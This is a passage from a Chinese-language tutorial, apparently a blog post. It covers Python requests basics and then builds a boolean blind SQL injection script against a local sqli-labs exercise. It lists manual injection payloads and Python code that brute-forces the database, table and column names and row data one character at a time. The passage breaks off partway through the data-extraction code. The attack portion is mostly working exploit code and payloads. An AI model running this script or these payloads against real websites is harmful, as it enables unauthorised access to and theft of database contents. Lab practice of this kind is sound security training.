class="line"><span class="comment"># 设置请求头</span></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()</span></span><br><span class="line">response = requests.get(<span class="string">&quot;https://www.runoob.com/&quot;</span>, params = kw, headers = headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应状态码</span></span><br><span class="line"><span class="built_in">print</span> (response.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应头部字符编码</span></span><br><span class="line"><span class="built_in">print</span> (response.encoding)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看完整url地址</span></span><br><span class="line"><span class="built_in">print</span> (response.url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应内容，response.text 返回的是Unicode格式的数据</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">200</span></span><br><span class="line">UTF-<span class="number">8</span></span><br><span class="line">https://www.runoob.com/?s=python+%E6%<span class="number">95</span>%<span class="number">99</span>%E7%A8%8B</span><br><span class="line"></span><br><span class="line"><span class="meta">... </span>其他内容...</span><br></pre></td></tr></table></figure><p>post() 方法可以发送 POST 请求到指定 url，一般格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.post(url, data=&#123;key: value&#125;, json=&#123;key: value&#125;, args)</span><br></pre></td></tr></table></figure><ul><li><strong>url</strong> 请求 url。</li><li><strong>data</strong> 参数为要发送到指定 url 的字典、元组列表、字节或文件对象。</li><li><strong>json</strong> 参数为要发送到指定 url 的 JSON 对象。</li><li><strong>args</strong> 为其他参数，比如 cookies、headers、verify等。</li></ul><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.post(<span class="string">&#x27;https://www.runoob.com/try/ajax/demo_post.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=<span class="string">&#x27;color:red;&#x27;</span>&gt;本内容是使用 POST 方法请求的。&lt;/p&gt;&lt;p style=<span class="string">&#x27;color:red;&#x27;</span>&gt;请求时间：</span><br><span class="line"><span class="number">2022</span>-05-<span class="number">26</span> <span class="number">17</span>:<span class="number">30</span>:<span class="number">47</span>&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>post请求带参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 表单参数，参数名为 fname 和 lname</span></span><br><span class="line">myobj = &#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;RUNOOB&#x27;</span>,<span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Boy&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.post(<span class="string">&#x27;https://www.runoob.com/try/ajax/demo_post2.php&#x27;</span>, data = myobj)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=<span class="string">&#x27;color:red;&#x27;</span>&gt;你好，RUNOOB Boy，今天过得怎么样？&lt;/p&gt;</span><br></pre></td></tr></table></figure><p><strong>附加请求参数</strong></p><p>发送请求我们可以在请求中附加额外的参数，例如请求头、查询参数、请求体等，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0&#x27;</span>&#125;  <span class="comment"># 设置请求头</span></span><br><span class="line">params = &#123;<span class="string">&#x27;key1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>: <span class="string">&#x27;value2&#x27;</span>&#125;  <span class="comment"># 设置查询参数</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;example&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;  <span class="comment"># 设置请求体</span></span><br><span class="line">response = requests.post(<span class="string">&#x27;https://www.runoob.com&#x27;</span>, headers=headers, params=params, data=data)</span><br></pre></td></tr></table></figure><p>上述代码发送一个 POST 请求，并附加了请求头、查询参数和请求体。</p><p>除了基本的 GET 和 POST 请求外，requests 还支持其他 HTTP 方法，如 PUT、DELETE、HEAD、OPTIONS 等。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们的脚本首先要实现的是向指定页面以指定方式发送请求，所以要用到一下几个东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># 发送请求</span></span><br><span class="line">x = requests.get(<span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">text</th><th>返回响应的内容，unicode 类型数据</th></tr></thead></table><p><code>text</code>返回响应的内容，在布尔盲注时，我们根据响应的内容的长度来判断页面回显的真假</p><p>有了这些知识，我们就可以继续脚本的编写了</p><h2 id="手动盲注payload"><a href="#手动盲注payload" class="headerlink" title="手动盲注payload"></a>手动盲注payload</h2><p>手动盲注的payload是脚本的核心，接下来的脚本的SQL注入语句都在这里</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>先判断库名长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=1 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=3 --+</span></span><br><span class="line"><span class="string">......</span></span><br></pre></td></tr></table></figure><p>猜解库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (substr(database(),1,1))=&quot;a&quot; --+</span></span><br></pre></td></tr></table></figure><p>获取表的数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select count(*)table_name from information_schema.tables where table_schema=&#x27;security&#x27;)=4 --+</span><br></pre></td></tr></table></figure><p>获取表的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select LENGTH(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 1,1)=8 --+</span></span><br></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))=101 --+</span></span><br></pre></td></tr></table></figure><p>获取列数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.cloumns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;)=3 --+</span></span><br></pre></td></tr></table></figure><p>获取列长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select length(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)=2 --+</span></span><br></pre></td></tr></table></figure><p>获取列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1,1)=105 --+</span></span><br></pre></td></tr></table></figure><p>获数据数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(username) from users)=13 --+</span></span><br></pre></td></tr></table></figure><p>获取数据长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select length(username) from users limit 0,1)=4 --+</span></span><br></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select username from users limit 0,1),1,1))=68 --+</span></span><br></pre></td></tr></table></figure><h2 id="开始写脚本"><a href="#开始写脚本" class="headerlink" title="开始写脚本"></a>开始写脚本</h2><h4 id="头部："><a href="#头部：" class="headerlink" title="头部："></a>头部：</h4><p>首先实现对知道网页发送请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(url)</span><br></pre></td></tr></table></figure><p>可以对url参数中的url发起请求</p><p>我们使用<code>normalHtmlLen</code>来存放响应长度，通过比较响应长度来判断页面回显的真假</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/&quot;</span></span><br><span class="line"></span><br><span class="line">normalHtmlLen = <span class="built_in">len</span>(requests.get(url=url+<span class="string">&quot;?id=1&quot;</span>).text)</span><br><span class="line"><span class="comment"># normalHtmlLen是页面为真时的响应头的长度，和它比较来判断页面回显是否为真</span></span><br><span class="line"><span class="comment"># 我们知道当id=1时回显为真</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The len of HTML:&quot;</span>+<span class="built_in">str</span>(normalHtmlLen))   <span class="comment"># 打印响应头长度</span></span><br><span class="line"></span><br><span class="line">dbNameLen = <span class="number">0</span>       <span class="comment"># 响应头长度，初值为0</span></span><br></pre></td></tr></table></figure><h4 id="第一部分：猜解库名"><a href="#第一部分：猜解库名" class="headerlink" title="第一部分：猜解库名"></a>第一部分：猜解库名</h4><ol><li><p>首先判断库名的长度</p><p>通过一次循环来判断，输出库名长度</p></li><li><p>接着猜解库名</p><p>这里用两层循环，分别控制<code>substr</code>截取的地方和判断相等的地方</p><p><code>for a in range(33,127):</code>这里用ascii码来判断</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断库名长度</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dbNameLen_url = url + <span class="string">&quot;?id=1&#x27;+and+length(database())=&quot;</span>+<span class="built_in">str</span>(dbNameLen)+<span class="string">&quot;--+&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dbNameLen_url)       <span class="comment"># 每次输出payload,方便测试</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbNameLen_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The len of dbName:&quot;</span>+<span class="built_in">str</span>(dbNameLen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dbNameLen == <span class="number">30</span>:          </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)       </span><br><span class="line">        <span class="keyword">break</span>                <span class="comment"># 30次判断仍不对则则报错</span></span><br><span class="line">    dbNameLen += <span class="number">1</span></span><br><span class="line">dbName = <span class="string">&quot;&quot;</span>              <span class="comment"># 定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜解库名</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dbNameLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">        dbName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr(database(),&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1))=&#x27;&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line">        <span class="comment"># 拼接URL,变量是substr的第2个参数,有两处需要拼接的地方</span></span><br><span class="line">        <span class="built_in">print</span>(dbName_url)</span><br><span class="line">        <span class="comment"># 每次拼接完成后看看效果,测试有没有拼接错</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbName_url).text) == normalHtmlLen:</span><br><span class="line">            dbName += <span class="built_in">chr</span>(a)</span><br><span class="line">            <span class="comment"># 将符合的字母填充到预先设计好的空字符串中</span></span><br><span class="line">            <span class="built_in">print</span>(dbName)</span><br><span class="line">            <span class="keyword">break</span><span class="comment"># 结束的是单次的内部循环,不能结束外部循环</span></span><br></pre></td></tr></table></figure><h4 id="第二部分：猜解表名"><a href="#第二部分：猜解表名" class="headerlink" title="第二部分：猜解表名"></a>第二部分：猜解表名</h4><ol><li>判断表的个数</li><li>判断每个表的长度</li><li>猜解每个表</li></ol><p>这部分和猜解库名时的不同是：表的个数有多个，所以我们需要分别将每个表的长度判断出来再猜解表名</p><p>这就需要一个稍复杂的循环，这是脚本中最复杂的部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断表名数量、各个表名长度并猜解表名</span></span><br><span class="line">sheNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sheNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(*)table_name from information_schema.tables where table_schema=&#x27;security&#x27;)=&quot;</span> +<span class="built_in">str</span>(sheNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">    <span class="comment"># COUNT(*) 函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(sheNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of sche:&quot;</span>+<span class="built_in">str</span>(sheNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sheNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解表的数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来是判断表名长度并猜解表名</span></span><br><span class="line">sheNames=<span class="string">&quot;&quot;</span>              <span class="comment"># 最后输出所以表名用，定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, sheNum):</span><br><span class="line">    sheNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sheNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(sheNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">       </span><br><span class="line">        <span class="built_in">print</span>(sheNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of schename&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(sheNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sheNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 猜解表名        </span></span><br><span class="line">    sheName = <span class="string">&quot;&quot;</span>    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, sheNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            sheName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(sheName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheName_url).text) == normalHtmlLen:</span><br><span class="line">                sheName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(sheName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    sheNames+=sheName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;database: &quot;</span>+dbName)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tabales: &quot;</span>+sheNames)</span><br><span class="line"><span class="comment"># 库名表名猜解完成</span></span><br></pre></td></tr></table></figure><h4 id="第三部分：猜解列名"><a href="#第三部分：猜解列名" class="headerlink" title="第三部分：猜解列名"></a>第三部分：猜解列名</h4><p>本部分的思路与猜解表名是相同，就不多赘述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#猜解列名</span></span><br><span class="line">database = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的数据库: &quot;</span>)</span><br><span class="line">table_name = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line"><span class="comment"># 可选择要查的表</span></span><br><span class="line"></span><br><span class="line">colNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    colNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27;)=&quot;</span> +<span class="built_in">str</span>(colNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># COUNT函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(colNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of col:&quot;</span>+<span class="built_in">str</span>(colNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    colNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解列的数量</span></span><br><span class="line"></span><br><span class="line">colNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, colNum):</span><br><span class="line">    colNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        colNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(colNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(colNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of colname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(colNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        colNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    colName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, colNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            colName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(colName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colName_url).text) == normalHtmlLen:</span><br><span class="line">                colName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(colName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    colNames+=colName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;columns: &quot;</span> + colNames)</span><br><span class="line"><span class="comment"># 猜解列名完成</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="第四部分：拿数据"><a href="#第四部分：拿数据" class="headerlink" title="第四部分：拿数据"></a>第四部分：拿数据</h4><p>思路和猜解表名库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 